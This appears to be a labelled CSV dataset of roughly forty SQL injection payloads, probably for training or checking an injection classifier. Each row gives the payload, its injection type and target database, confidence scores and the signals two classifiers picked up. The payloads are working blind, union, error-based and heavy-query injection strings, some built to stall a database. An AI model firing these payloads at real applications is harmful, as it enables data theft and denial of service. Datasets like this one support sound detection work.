payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"1' ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( 'nond' = 'nond",time_blind,mysql,0.9,benchmark() for time blind,KEEP,,time_blind,mysql,817,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( 'nond' = 'nond"
"-1617%"" or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""%"" = """,boolean_blind,generic,0.8,IN with char concatenation for blind,KEEP,,boolean_blind,generic,818,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-1617%"" or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""%"" = """
"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ""xeki"" like ""xeki",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,819,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ""xeki"" like ""xeki"
"1' or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) )",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,820,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1' or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) )"
1'+ ( select 'nlvq' where 7528 = 7528 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,821,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1'+ ( select 'nlvq' where 7528 = 7528 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #
"1%"" ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( ""%"" = """,boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,822,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1%"" ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( ""%"" = """
"1"" ) ) as brwj where 9180 = 9180",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,823,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) ) as brwj where 9180 = 9180"
-7941 or ( 5822 = 8754 ) *8754-- eepn,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,824,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,-7941 or ( 5822 = 8754 ) *8754-- eepn
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ""gydr"" like ""gydr",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,825,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ""gydr"" like ""gydr"
1%' ) ) and ( 3020 = 3020 ) *6703 and ( ( '%' = ',boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,826,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,1%' ) ) and ( 3020 = 3020 ) *6703 and ( ( '%' = '
-7758%' ) ) ) or 3038 = 3038,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,827,boolean_blind,generic,Pattern match: 'or 3038 = 3038' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-7758%' ) ) ) or 3038 = 3038
"-6519' ) ) as tdlt where 5040 = 5040 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",boolean_blind,mssql,0.8,CONVERT for MSSQL blind,KEEP,,boolean_blind,mssql,828,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-6519' ) ) as tdlt where 5040 = 5040 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --"
"-4305 ) ) ) union all select 2401,2401--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,829,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-4305 ) ) ) union all select 2401,2401--"
"-1510"" ) as rqrv where 4507 = 4507 union all select 4507,4507,4507,4507,4507--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,830,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1510"" ) as rqrv where 4507 = 4507 union all select 4507,4507,4507,4507,4507--"
select ( case when ( 1499 = 4923 ) then 1499 else 1/ ( select 0 ) end ) --,boolean_blind,generic,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,generic,831,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 1499 = 4923 ) then 1499 else 1/ ( select 0 ) end ) --
1 or sleep ( 5 ) # tdgb,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,832,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,1 or sleep ( 5 ) # tdgb
"1%"" ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,833,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1%"" ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --"
"1"" and sleep ( 5 ) and ""tdid"" like ""tdid",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,834,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1"" and sleep ( 5 ) and ""tdid"" like ""tdid"
1' ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( 'czqk' like 'czqk,boolean_blind,generic,0.8,rlike() for boolean blind,KEEP,,boolean_blind,generic,835,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1' ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( 'czqk' like 'czqk
1' ) ) as kdse where 6767 = 6767 rlike sleep ( 5 ) #,time_blind,generic,0.9,sleep() with rlike for time blind,KEEP,,time_blind,generic,836,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1' ) ) as kdse where 6767 = 6767 rlike sleep ( 5 ) #
"1"" ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ""rrbl"" = ""rrbl",error_based,oracle,0.9,ctxsys.drithsx for Oracle error-based,KEEP,,error_based,oracle,837,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"1"" ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ""rrbl"" = ""rrbl"
"-9440"" union all select 5599,5599,5599,5599,5599--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,838,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9440"" union all select 5599,5599,5599,5599,5599--"
"-5204"" ) union all select 7186,7186,7186--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,839,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5204"" ) union all select 7186,7186,7186--"
"1' ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( 'ujjr' = 'ujjr",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,840,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1' ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( 'ujjr' = 'ujjr"
"1' ) as dvoy where 7906 = 7906 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,841,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1' ) as dvoy where 7906 = 7906 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --"
"1'+ ( select kqac where 4362 = 4362 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,842,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1'+ ( select kqac where 4362 = 4362 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --"
"-5616"" ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""hdrb"" like ""hdrb",boolean_blind,mssql,0.8,CONVERT for MSSQL blind,KEEP,,boolean_blind,mssql,843,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-5616"" ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""hdrb"" like ""hdrb"
"1"" ) ) and 7533 = 7533 and ( ( ""rnni"" like ""rnni",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,844,boolean_blind,generic,Pattern match: 'and 7533 = 7533' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","1"" ) ) and 7533 = 7533 and ( ( ""rnni"" like ""rnni"
-4557 or 6872 = 6872-- kkte,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,845,boolean_blind,generic,Pattern match: 'or 6872 = 6872' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-4557 or 6872 = 6872-- kkte
( select ( case when ( 6581 = 6581 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual ),boolean_blind,oracle,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,oracle,846,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,( select ( case when ( 6581 = 6581 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual )
1 ) as cwsi where 7360 = 7360 or sleep ( 5 ) #,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,847,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1 ) as cwsi where 7360 = 7360 or sleep ( 5 ) #
-2307' ) ) ) or 6872 = 6872 and ( ( ( 'fyok' like 'fyok,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,848,boolean_blind,generic,Pattern match: 'or 6872 = 6872' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-2307' ) ) ) or 6872 = 6872 and ( ( ( 'fyok' like 'fyok
1%' or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,849,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1%' or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #
"1' ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.9,benchmark() for time blind,KEEP,,time_blind,mysql,850,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #"
"1"" where 3678 = 3678 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,851,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1"" where 3678 = 3678 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --"
1' ) as xiqw where 8507 = 8507 rlike sleep ( 5 ) --,time_blind,generic,0.9,sleep() with rlike for time blind,KEEP,,time_blind,generic,852,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1' ) as xiqw where 8507 = 8507 rlike sleep ( 5 ) --
"1, ( select ( case when ( 7616 = 7616 ) then 1 else 1/ ( select 0 ) end ) )",boolean_blind,generic,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,generic,853,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1, ( select ( case when ( 7616 = 7616 ) then 1 else 1/ ( select 0 ) end ) )"
1' ) ) as vwua where 8099 = 8099 union all select null--,union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,854,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,1' ) ) as vwua where 8099 = 8099 union all select null--
1 ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ),boolean_blind,generic,0.8,rlike() for boolean blind,KEEP,,boolean_blind,generic,855,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1 ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) )
"-2920"" ) ) as zdgv where 9702 = 9702 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",boolean_blind,postgresql,0.8,IN with char for blind,KEEP,,boolean_blind,postgresql,856,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-2920"" ) ) as zdgv where 9702 = 9702 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --"
"1'+ ( select 'arzm' where 6464 = 6464 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) ) +'",time_blind,mysql,0.9,benchmark() for time blind,KEEP,,time_blind,mysql,857,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1'+ ( select 'arzm' where 6464 = 6464 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) ) +'"
select sleep ( 5 ) and ( 'hhlq' like 'hhlq,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,858,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,select sleep ( 5 ) and ( 'hhlq' like 'hhlq
( cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 7992 = 7992 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ),boolean_blind,postgresql,0.8,CAST for PostgreSQL blind,KEEP,,boolean_blind,postgresql,859,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,( cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 7992 = 7992 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) )
